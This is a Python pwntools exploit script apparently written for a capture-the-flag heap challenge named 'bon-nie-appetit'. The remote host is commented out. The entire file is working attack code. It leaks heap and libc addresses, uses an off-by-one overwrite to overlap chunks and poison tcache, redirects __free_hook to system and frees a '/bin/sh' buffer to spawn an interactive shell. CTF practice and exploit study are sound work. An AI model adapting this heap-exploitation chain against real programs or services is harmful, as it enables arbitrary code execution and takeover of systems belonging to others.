#!/usr/bin/env python3


from pwn import *


e = ELF("./bon-nie-appetit")
r = process("./bon-nie-appetit")
#r = remote("188.166.172.138",31232)
libc = ELF("glibc/libc.so.6")
def malloc(size,data):
    r.sendlineafter(b">",b"1")
    r.sendlineafter(b"how many:",f"{size}")
    r.sendafter(b"to order:",data)

def show_heap(index):
    r.sendlineafter(b">",b"2")
    r.sendlineafter("Number of order:",f"{index}")
    r.recvuntil(b"[+] Order[0] => ")
    leak = u64(r.recvline().strip().decode('latin-1').ljust(8,'\x00'))
    return leak

def show_libc(index):
    r.sendlineafter(b">",b"2")
    r.sendlineafter("Number of order:",f"{index}")
    r.recvuntil(b"[+] Order[1] => ")
    leak = u64(r.recvline().strip().decode('latin-1').ljust(8,'\x00'))
    return leak

def edit(index,data):
    r.sendlineafter(b">",b"3")
    r.sendlineafter("Number of order:",f"{index}")
    r.sendafter(b"New order:",data)
    
def delete(index):
    r.sendlineafter(b">",b"4")
    r.sendlineafter("Number of order:",f"{index}")


malloc(100,b"A" * 32)
malloc(100,b"B" * 32)
delete(0)
delete(1)
malloc(100,p8(0x60))
heap_base = show_heap(0) - 0x260
log.info("The heap base of the process is " + hex(heap_base))
malloc(1600,b"A" * 1024)
malloc(32,b"A" * 32)
delete(1)
malloc(1600,p8(0xa0))
libc_base = show_libc(1) - 0x3ebca0
log.info("The libc base of the process is " + hex(libc_base))
malloc(100,b"JUNK")
malloc(104,b"C" * 104) #4
malloc(40,b"D" * 32) #5
malloc(100,b"E" * 56 + p64(0x31)) #6
edit(4,b"C" * 104 + p8(0x71))
delete(3)
delete(6)
delete(5)
malloc(100,b"D" * 40 + p64(0x71) + p64(libc_base + libc.sym.__free_hook))
malloc(100,b"/bin/sh\x00")
malloc(100,p64(libc_base + libc.sym.system))
delete(5)
r.recv()
r.interactive()
